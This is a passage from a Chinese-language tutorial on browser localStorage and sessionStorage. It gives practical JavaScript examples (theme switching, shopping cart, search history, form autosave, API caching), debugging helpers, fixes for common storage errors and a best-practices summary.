      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
      this.apply(prefersDark ? 'dark' : 'light');
    }
  },

  apply(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    localStorage.setItem(this.STORAGE_KEY, theme);
  },

  toggle() {
    const current = localStorage.getItem(this.STORAGE_KEY) || 'light';
    this.apply(current === 'light' ? 'dark' : 'light');
  }
};

// 初始化
ThemeManager.init();

// 切换主题
document.querySelector('#theme-toggle').addEventListener('click', () => {
  ThemeManager.toggle();
});
```

### 11.2 购物车功能

```javascript
class ShoppingCart {
  constructor() {
    this.STORAGE_KEY = 'shopping-cart';
  }

  getItems() {
    const data = localStorage.getItem(this.STORAGE_KEY);
    return data ? JSON.parse(data) : [];
  }

  saveItems(items) {
    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(items));
  }

  addItem(product) {
    const items = this.getItems();
    const existingIndex = items.findIndex(item => item.id === product.id);
    
    if (existingIndex > -1) {
      items[existingIndex].quantity += 1;
    } else {
      items.push({ ...product, quantity: 1 });
    }
    
    this.saveItems(items);
    return items;
  }

  removeItem(productId) {
    const items = this.getItems().filter(item => item.id !== productId);
    this.saveItems(items);
    return items;
  }

  updateQuantity(productId, quantity) {
    const items = this.getItems();
    const item = items.find(item => item.id === productId);
    
    if (item) {
      item.quantity = Math.max(0, quantity);
      if (item.quantity === 0) {
        return this.removeItem(productId);
      }
      this.saveItems(items);
    }
    
    return items;
  }

  getTotal() {
    return this.getItems().reduce((total, item) => {
      return total + item.price * item.quantity;
    }, 0);
  }

  clear() {
    localStorage.removeItem(this.STORAGE_KEY);
  }
}

// 使用示例
const cart = new ShoppingCart();
cart.addItem({ id: 1, name: 'iPhone', price: 999 });
cart.addItem({ id: 2, name: 'AirPods', price: 199 });
console.log(cart.getTotal()); // 1198
```

### 11.3 搜索历史记录

```javascript
class SearchHistory {
  constructor(maxItems = 10) {
    this.STORAGE_KEY = 'search-history';
    this.maxItems = maxItems;
  }

  getHistory() {
    const data = localStorage.getItem(this.STORAGE_KEY);
    return data ? JSON.parse(data) : [];
  }

  add(keyword) {
    if (!keyword.trim()) return;
    
    let history = this.getHistory();
    
    // 移除重复项
    history = history.filter(item => item !== keyword);
    
    // 添加到开头
    history.unshift(keyword);
    
    // 限制数量
    if (history.length > this.maxItems) {
      history = history.slice(0, this.maxItems);
    }
    
    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(history));
    return history;
  }

  remove(keyword) {
    const history = this.getHistory().filter(item => item !== keyword);
    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(history));
    return history;
  }

  clear() {
    localStorage.removeItem(this.STORAGE_KEY);
  }
}

// 使用示例
const searchHistory = new SearchHistory(5);
searchHistory.add('JavaScript');
searchHistory.add('Vue.js');
console.log(searchHistory.getHistory()); // ['Vue.js', 'JavaScript']
```

### 11.4 表单自动保存

```javascript
class FormAutoSave {
  constructor(formId, saveInterval = 3000) {
    this.form = document.getElementById(formId);
    this.STORAGE_KEY = `form-autosave-${formId}`;
    this.saveInterval = saveInterval;
    this.timer = null;
    
    this.init();
  }

  init() {
    // 恢复保存的数据
    this.restore();
    
    // 监听输入事件
    this.form.addEventListener('input', () => {
      this.debouncedSave();
    });
    
    // 提交时清除保存的数据
    this.form.addEventListener('submit', () => {
      this.clear();
    });
    
    // 页面关闭前保存
    window.addEventListener('beforeunload', () => {
      this.save();
    });
  }

  save() {
    const formData = new FormData(this.form);
    const data = Object.fromEntries(formData);
    sessionStorage.setItem(this.STORAGE_KEY, JSON.stringify({
      data,
      timestamp: Date.now()
    }));
  }

  debouncedSave() {
    clearTimeout(this.timer);
    this.timer = setTimeout(() => this.save(), this.saveInterval);
  }

  restore() {
    const saved = sessionStorage.getItem(this.STORAGE_KEY);
    if (!saved) return;
    
    const { data, timestamp } = JSON.parse(saved);
    
    // 检查是否过期（超过 1 小时不恢复）
    if (Date.now() - timestamp > 60 * 60 * 1000) {
      this.clear();
      return;
    }
    
    // 恢复表单数据
    Object.entries(data).forEach(([name, value]) => {
      const input = this.form.querySelector(`[name="${name}"]`);
      if (input) {
        input.value = value;
      }
    });
    
    console.log('表单数据已恢复');
  }

  clear() {
    sessionStorage.removeItem(this.STORAGE_KEY);
  }
}

// 使用
new FormAutoSave('contact-form');
```

### 11.5 API 响应缓存

```javascript
class APICache {
  constructor(defaultTTL = 5 * 60 * 1000) { // 默认 5 分钟
    this.defaultTTL = defaultTTL;
  }

  getCacheKey(url, params = {}) {
    const paramStr = JSON.stringify(params);
    return `api-cache:${url}:${paramStr}`;
  }

  async fetch(url, options = {}) {
    const { ttl = this.defaultTTL, forceRefresh = false, ...fetchOptions } = options;
    const cacheKey = this.getCacheKey(url, fetchOptions);

    // 检查缓存
    if (!forceRefresh) {
      const cached = this.getFromCache(cacheKey);
      if (cached) {
        console.log('从缓存返回:', url);
        return cached;
      }
    }

    // 发起请求
    console.log('发起网络请求:', url);
    const response = await fetch(url, fetchOptions);
    const data = await response.json();

    // 存入缓存
    this.setToCache(cacheKey, data, ttl);

    return data;
  }

  getFromCache(key) {
    const cached = localStorage.getItem(key);
    if (!cached) return null;

    const { data, expiry } = JSON.parse(cached);
    if (Date.now() > expiry) {
      localStorage.removeItem(key);
      return null;
    }

    return data;
  }

  setToCache(key, data, ttl) {
    const item = {
      data,
      expiry: Date.now() + ttl
    };
    
    try {
      localStorage.setItem(key, JSON.stringify(item));
    } catch (e) {
      // 存储满了，清理旧缓存
      this.clearExpired();
      try {
        localStorage.setItem(key, JSON.stringify(item));
      } catch {
        console.warn('缓存存储失败');
      }
    }
  }

  clearExpired() {
    const now = Date.now();
    Object.keys(localStorage)
      .filter(key => key.startsWith('api-cache:'))
      .forEach(key => {
        try {
          const { expiry } = JSON.parse(localStorage.getItem(key));
          if (now > expiry) {
            localStorage.removeItem(key);
          }
        } catch {
          localStorage.removeItem(key);
        }
      });
  }

  clearAll() {
    Object.keys(localStorage)
      .filter(key => key.startsWith('api-cache:'))
      .forEach(key => localStorage.removeItem(key));
  }
}

// 使用示例
const apiCache = new APICache();

// 带缓存的 API 请求
const users = await apiCache.fetch('/api/users', { ttl: 10 * 60 * 1000 });

// 强制刷新
const freshUsers = await apiCache.fetch('/api/users', { forceRefresh: true });
```

---

## 12. 调试技巧

### 12.1 浏览器开发者工具

在 Chrome DevTools 中查看和编辑 Storage：

1. 打开开发者工具（F12）
2. 切换到 "Application" 标签
3. 在左侧找到 "Storage" → "Local Storage" 或 "Session Storage"
4. 可以直接查看、编辑、删除数据

### 12.2 控制台调试

```javascript
// 查看所有 localStorage 数据
console.table(localStorage);

// 查看所有 sessionStorage 数据
console.table(sessionStorage);

// 格式化输出 JSON 数据
const userData = localStorage.getItem('user');
console.log(JSON.parse(userData));

// 监控存储变化
const originalSetItem = localStorage.setItem;
localStorage.setItem = function(key, value) {
  console.log(`[localStorage] 设置 ${key}:`, value);
  originalSetItem.apply(this, arguments);
};

const originalRemoveItem = localStorage.removeItem;
localStorage.removeItem = function(key) {
  console.log(`[localStorage] 删除 ${key}`);
  originalRemoveItem.apply(this, arguments);
};
```

### 12.3 调试工具函数

```javascript
const StorageDebug = {
  // 打印所有存储数据
  logAll(storage = localStorage) {
    console.group('Storage 内容');
    for (let i = 0; i < storage.length; i++) {
      const key = storage.key(i);
      const value = storage.getItem(key);
      try {
        console.log(key, JSON.parse(value));
      } catch {
        console.log(key, value);
      }
    }
    console.groupEnd();
  },

  // 计算存储使用量
  getUsage(storage = localStorage) {
    let total = 0;
    for (let key in storage) {
      if (storage.hasOwnProperty(key)) {
        total += key.length + storage.getItem(key).length;
      }
    }
    return {
      bytes: total * 2,
      kb: (total * 2 / 1024).toFixed(2),
      mb: (total * 2 / 1024 / 1024).toFixed(4)
    };
  },

  // 导出所有数据
  export(storage = localStorage) {
    const data = {};
    for (let i = 0; i < storage.length; i++) {
      const key = storage.key(i);
      data[key] = storage.getItem(key);
    }
    return JSON.stringify(data, null, 2);
  },

  // 导入数据
  import(jsonString, storage = localStorage) {
    const data = JSON.parse(jsonString);
    Object.entries(data).forEach(([key, value]) => {
      storage.setItem(key, value);
    });
  }
};

// 使用
StorageDebug.logAll();
console.log('使用量:', StorageDebug.getUsage());
```

---

## 13. 常见错误与解决方案

### 13.1 QuotaExceededError - 存储空间已满

**错误信息**：
```
Uncaught DOMException: Failed to execute 'setItem' on 'Storage': 
Setting the value of 'xxx' exceeded the quota.
```

**原因**：存储空间已满（通常是 5MB 限制）

**解决方案**：
```javascript
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      console.error('存储空间已满，尝试清理...');
      
      // 方案1：清理过期数据
      cleanExpiredData();
      
      // 方案2：清理最旧的数据
      removeOldestItems(5);
      
      // 重试
      try {
        localStorage.setItem(key, value);
      } catch {
        console.error('清理后仍然无法存储');
        // 方案3：提示用户手动清理
        alert('存储空间不足，请清理浏览器数据');
      }
    }
  }
}

function removeOldestItems(count) {
  const items = [];
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    items.push(key);
  }
  // 删除前 N 个
  items.slice(0, count).forEach(key => localStorage.removeItem(key));
}
```

### 13.2 JSON.parse 解析错误

**错误信息**：
```
Uncaught SyntaxError: Unexpected token u in JSON at position 0
```

**原因**：尝试解析 `null`、`undefined` 或非 JSON 格式的字符串

**解决方案**：
```javascript
// ❌ 错误写法
const data = JSON.parse(localStorage.getItem('notExist')); // 报错！

// ✅ 正确写法
function safeJSONParse(str, defaultValue = null) {
  if (str === null || str === undefined) {
    return defaultValue;
  }
  try {
    return JSON.parse(str);
  } catch (e) {
    console.error('JSON 解析失败:', e);
    return defaultValue;
  }
}

const data = safeJSONParse(localStorage.getItem('notExist'), {});
```

### 13.3 隐私模式下存储不可用

**错误信息**：
```
Uncaught DOMException: Failed to execute 'setItem' on 'Storage': 
Access is denied for this document.
```

**原因**：Safari 隐私模式、某些浏览器设置禁用了 Storage

**解决方案**：
```javascript
function isStorageAvailable(type = 'localStorage') {
  try {
    const storage = window[type];
    const testKey = '__storage_test__';
    storage.setItem(testKey, testKey);
    storage.removeItem(testKey);
    return true;
  } catch (e) {
    return false;
  }
}

// 使用内存存储作为降级方案
class MemoryStorage {
  constructor() {
    this.data = {};
  }
  
  getItem(key) {
    return this.data[key] || null;
  }
  
  setItem(key, value) {
    this.data[key] = String(value);
  }
  
  removeItem(key) {
    delete this.data[key];
  }
  
  clear() {
    this.data = {};
  }
  
  get length() {
    return Object.keys(this.data).length;
  }
  
  key(index) {
    return Object.keys(this.data)[index] || null;
  }
}

// 自动选择可用的存储
const storage = isStorageAvailable('localStorage') 
  ? localStorage 
  : new MemoryStorage();
```

### 13.4 存储对象时变成 [object Object]

**错误示例**：
```javascript
localStorage.setItem('user', { name: 'John' });
console.log(localStorage.getItem('user')); // "[object Object]" 😱
```

**原因**：Storage 只能存储字符串，对象会被自动调用 `toString()`

**解决方案**：
```javascript
// ✅ 使用 JSON.stringify
localStorage.setItem('user', JSON.stringify({ name: 'John' }));
const user = JSON.parse(localStorage.getItem('user'));
console.log(user.name); // "John"
```

### 13.5 删除 Cookie 时路径/域名不匹配

**问题**：调用 `removeItem` 后数据仍然存在

**原因**：这通常是混淆了 Cookie 和 Storage。Storage 的删除很简单，但如果你在处理 Cookie，需要匹配路径和域名。

**解决方案**：
```javascript
// Storage 删除很简单
localStorage.removeItem('key');

// 确认删除成功
if (localStorage.getItem('key') === null) {
  console.log('删除成功');
} else {
  console.log('删除失败，检查键名是否正确');
}
```

### 13.6 storage 事件不触发

**问题**：监听了 storage 事件但没有触发

**原因**：storage 事件只在**其他标签页**修改数据时触发，当前标签页修改不会触发

**解决方案**：
```javascript
// 如果需要在当前页面也监听变化，可以封装一个自定义事件
class ObservableStorage {
  constructor(storage = localStorage) {
    this.storage = storage;
    this.listeners = new Map();
  }

  setItem(key, value) {
    const oldValue = this.storage.getItem(key);
    this.storage.setItem(key, value);
    this.emit(key, { oldValue, newValue: value });
  }

  removeItem(key) {
    const oldValue = this.storage.getItem(key);
    this.storage.removeItem(key);
    this.emit(key, { oldValue, newValue: null });
  }

  getItem(key) {
    return this.storage.getItem(key);
  }

  on(key, callback) {
    if (!this.listeners.has(key)) {
      this.listeners.set(key, []);
    }
    this.listeners.get(key).push(callback);
  }

  off(key, callback) {
    const callbacks = this.listeners.get(key);
    if (callbacks) {
      const index = callbacks.indexOf(callback);
      if (index > -1) {
        callbacks.splice(index, 1);
      }
    }
  }

  emit(key, data) {
    const callbacks = this.listeners.get(key);
    if (callbacks) {
      callbacks.forEach(cb => cb(data));
    }
  }
}

// 使用
const observableStorage = new ObservableStorage();

observableStorage.on('user', ({ oldValue, newValue }) => {
  console.log('user 变化了:', oldValue, '->', newValue);
});

observableStorage.setItem('user', 'John'); // 会触发回调
```

### 13.7 循环引用导致 JSON.stringify 失败

**错误信息**：
```
Uncaught TypeError: Converting circular structure to JSON
```

**原因**：对象中存在循环引用

**解决方案**：
```javascript
// 处理循环引用的 stringify
function safeStringify(obj) {
  const seen = new WeakSet();
  return JSON.stringify(obj, (key, value) => {
    if (typeof value === 'object' && value !== null) {
      if (seen.has(value)) {
        return '[Circular]';
      }
      seen.add(value);
    }
    return value;
  });
}

// 测试
const obj = { name: 'John' };
obj.self = obj; // 循环引用

console.log(safeStringify(obj)); // {"name":"John","self":"[Circular]"}
```

### 13.8 跨域访问 Storage 失败

**问题**：在 iframe 中无法访问父页面的 Storage

**原因**：Storage 遵循同源策略，不同源的页面无法共享 Storage

**解决方案**：
```javascript
// 使用 postMessage 进行跨域通信

// 父页面
window.addEventListener('message', (event) => {
  // 验证来源
  if (event.origin !== 'https://trusted-child.com') return;
  
  const { type, key, value } = event.data;
  
  if (type === 'getStorage') {
    const result = localStorage.getItem(key);
    event.source.postMessage({ type: 'storageResult', key, value: result }, event.origin);
  } else if (type === 'setStorage') {
    localStorage.setItem(key, value);
    event.source.postMessage({ type: 'storageSet', key, success: true }, event.origin);
  }
});

// 子页面（iframe）
function getParentStorage(key) {
  return new Promise((resolve) => {
    const handler = (event) => {
      if (event.data.type === 'storageResult' && event.data.key === key) {
        window.removeEventListener('message', handler);
        resolve(event.data.value);
      }
    };
    window.addEventListener('message', handler);
    parent.postMessage({ type: 'getStorage', key }, 'https://parent-domain.com');
  });
}

// 使用
const value = await getParentStorage('sharedData');
```

### 13.9 数据类型丢失

**问题**：存储 Date、Map、Set 等特殊类型后无法正确恢复

**解决方案**：
```javascript
// 自定义序列化/反序列化
const TypedStorage = {
  set(key, value) {
    const wrapped = {
      type: this.getType(value),
      value: this.serialize(value)
    };
    localStorage.setItem(key, JSON.stringify(wrapped));
  },

  get(key) {
    const item = localStorage.getItem(key);
    if (!item) return null;
    
    const { type, value } = JSON.parse(item);
    return this.deserialize(type, value);
  },

  getType(value) {
    if (value instanceof Date) return 'Date';
    if (value instanceof Map) return 'Map';
    if (value instanceof Set) return 'Set';
    if (Array.isArray(value)) return 'Array';
    return typeof value;
  },

  serialize(value) {
    if (value instanceof Date) return value.toISOString();
    if (value instanceof Map) return Array.from(value.entries());
    if (value instanceof Set) return Array.from(value);
    return value;
  },

  deserialize(type, value) {
    switch (type) {
      case 'Date': return new Date(value);
      case 'Map': return new Map(value);
      case 'Set': return new Set(value);
      default: return value;
    }
  }
};

// 使用
TypedStorage.set('date', new Date());
TypedStorage.set('map', new Map([['a', 1], ['b', 2]]));
TypedStorage.set('set', new Set([1, 2, 3]));

console.log(TypedStorage.get('date')); // Date 对象
console.log(TypedStorage.get('map')); // Map 对象
console.log(TypedStorage.get('set')); // Set 对象
```

---

## 总结

### 核心要点

1. **localStorage vs sessionStorage**
   - localStorage：永久存储，跨标签页共享
   - sessionStorage：会话存储，仅当前标签页可用

2. **只能存储字符串**
   - 复杂数据需要 JSON.stringify/parse
   - 注意特殊类型（Date、Map、Set）的处理

3. **容量限制约 5MB**
   - 存储前检查空间
   - 实现清理策略

4. **安全性**
   - 不存储敏感信息
   - 防范 XSS 攻击
   - 必要时加密存储

5. **性能优化**
   - 避免频繁读写
   - 使用防抖/节流
   - 考虑数据压缩

### 最佳实践清单

- ✅ 使用 try-catch 包裹存储操作
- ✅ 使用 JSON 序列化复杂数据
- ✅ 实现过期时间机制
- ✅ 使用命名空间避免冲突
- ✅ 提供降级方案（隐私模式）
- ✅ 定期清理过期数据
- ❌ 不存储密码、Token 等敏感信息
- ❌ 不存储超大数据
- ❌ 不频繁同步读写
